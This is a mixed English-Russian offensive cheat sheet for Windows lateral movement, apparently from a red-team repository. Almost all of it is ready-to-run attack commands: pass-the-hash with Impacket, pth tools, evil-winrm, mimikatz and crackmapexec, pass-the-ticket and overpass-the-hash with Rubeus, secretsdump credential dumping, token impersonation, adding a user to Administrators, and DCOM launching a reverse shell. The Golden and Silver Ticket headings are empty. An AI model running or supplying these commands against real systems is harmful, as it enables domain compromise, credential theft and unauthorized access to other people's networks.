## Pass the Hash:  
**Impacket and pth**: 
export SMBHASH=NTML hash
1) psexec.py -hashes LM:NTLM admin@target  
2) wmiexec.py -hashes :NTLM admin@target  
3) pth-winexe -U admin% //target cmd  
4) pth-wmic -U admin% //target "select Name from Win32_UserAccount"  
5) pth-wmis -U admin% //target "cmd.exe /c whoami > c:\out.txt"
6) pth-smbclient -U admin% //target/c$
7) pth-rpcclient -U admin% //target
8) pth-sqsh -U admin -S target
9) pth-curl http://target/exec?cmd=ipconfig
10) pth-net rpc group ADDMEM 'Administrators' username -S target -U domain/user

**Evil-winrm**:  
evil-winrm -i target -u admin -H "NT hash value"

**Windows (mimikatz)**:  
mimikatz.exe securlsa::pth /user:username /domain:domain /ntlm:NTLM_HASH /run:cmd  

**RDP**:  
xfreerdp /u:<user> /d:domain /pth:hash /v:ipAddr 

**CME**:  
crackmapexec smb <IP> -u username -H ":NT hash value"  

## PowerShell-Remoting: 

Enter-PSSession -ComputerName <computername> -Credentials <domain>\username  

Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <computername> -Credentials <domain>\username  

$session = New-PSSession -ComputerName <computer name> -verbose  
Enter-PSSession -Session $session -Verbose  
Invoke-Command -Session $session -ScriptBlock {whoami;hostname} -Verbose  

## REG.EXE:  
reg.exe; //Удаленный доступ к реестру с правами на запись на самом деле нам дает RCE.  
  
## DCERPC:  
Использует порты 135/TCP и 4915x/TCP, где 4915x — динамически назначаемые порты. Иногда могут использоваться порты из другого диапазона.  

1. wmiexec.py admin@target; //wmiexec.py -nooutput admin@target "mkdir c:\pwn".  
2. dcomexec.py admin@target; //dcomexec.py -nooutput admin@10.0.0.64 "mkdir c:\123".  
3. wmis -U admin //target "mkdir c:\pwn"/  
4. wmic.exe /user:username /password:password /node:target process call create '"c:\123".  
5. sc.exe; //Назначение инструмента — удаленное управление службами и драйверами. 
    - sc.exe \\target create testservice binPath= \path\to\prog start= auto  
    - sc.exe \\target start testservice  

## Pass the Ticket (Rubeus):  

**Description**: Если у нас имеется Kerberos-билет TGT (билет пользователя), то мы можем применить егодля аутентификации. При этом Linux и Windows используют разные форматы — ccache и kirbi соответственно.  

  **First step**: [steal ticket](https://github.com/Kerkroups/Cyber-Kill-Chain/blob/main/Data%20Gathering%20-%20Credentials%20Theft.md#%D0%B8%D0%B7%D0%B2%D0%BB%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-kerberos-tickest-rubeus)  
**Second step**: create hidden process  
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:username /password:fakepassword  
**Pass the ticket**: Rubeus.exe ptt /luid:(luid of areated process) /ticket:(stolen ticket)  
  
**Tools to steal token**:  
  1. https://github.com/slyd0g/PrimaryTokenTheft  
  2. https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation  
  3. Cobalt Strike, Covenant.  

**WINDOWS (Mimikatz)**:  
mimikatz# kerberos::ptt c:\path\to\tgt.kirbi  
mimikatz# kerberos::ptс c:\path\to\tgt.ccache  
После импорта используем любую нужную нам программу без указания каких‐либо ключей: dir \\dc.company.org\c$  

Под Linux делаем Pass-the-Ticket в формате ccache:  
cp tgt.ccache /tmp/krb5cc_0  
klist  
Конертируем билет в ccache: kekeo.exe "misc::convert ccache ticket.kirbi" "exit"  
После импорта билеты в Linux используем следующим образом:   
  - smbclient -k //dc.company.org/c$  
  - winexe -k yes -N //dc.company.org cmd  
  
Инструменты из набора impacket могут использовать билеты без предварительного импорта: Чтобы использовать Kerberos-билет при аутентификации, нужно обращаться к target по имени, а не по IP-адресу.  

KRB5CCNAME=`pwd`/tgt.ccache psexec.py -k -dc-ip 10.0.0.1 target.domain.com  
KRB5CCNAME=`pwd`/tgt.ccache secretsdump.py -k -no-pass target.domain.com  

## Overpass the Hash (Rubeus):  
**Overpass the hash is a technique which allows us to request a Kerberos TGT for a user use their NTLM or AES hash**.  
Rubeus.exe asktgt /user:username /aes256:(aes256 hash) /opsec /nowrap

## Token Impersonation (Incognito):  
load_incognito //load module;  
list_tokens -u //list available tokens;  
impersonate_token [domain]\\[username] //impersonate token;  
shell //get shell with privilege of stealed token;  

## DCOM:  
[Invoke-DCOM.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) example:  
1) powershell-import C:\Tools\Invoke-DCOM.ps1  
2) powershell Invoke-DCOM -ComputerName dc.domain.local -Method MMC20.Application -Command C:\Windows\reverse_shell.exe  
  
**Aditional information and techniques**:  
  - https://www.ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model  
  - https://redblue42.code42.com/detecting-lateral-movement-via-dcom/  

## GOLDEN TICKET:  
  
  
## SILVER TICKET:  
  



  
